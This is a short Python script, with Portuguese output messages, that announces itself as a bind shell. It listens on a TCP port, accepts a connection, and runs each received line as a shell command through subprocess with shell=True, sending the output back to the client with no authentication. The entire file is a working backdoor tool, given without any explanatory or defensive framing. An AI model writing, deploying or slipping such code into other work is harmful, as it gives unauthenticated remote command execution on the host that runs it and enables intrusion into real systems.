#!/bin/python

import socket
import subprocess

HOST = "localhost"
PORT = 8000
BUFFER = 1024

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    sock.listen(5)

    print(f"Bind shell executando em {HOST}:{PORT}")

    client_connection, client_address = sock.accept()
    with client_connection:
        print(f"Cliente conectado de {client_address}")

        while True:
            comando = client_connection.recv(BUFFER).decode('utf-8').strip()
            if not comando:
                break

            try:
                result = subprocess.check_output(comando, shell=True, universal_newlines=True)
            except Exception as e:
                result = f"Erro ao executar: {e}"

            client_connection.sendall(result.encode('utf-8'))
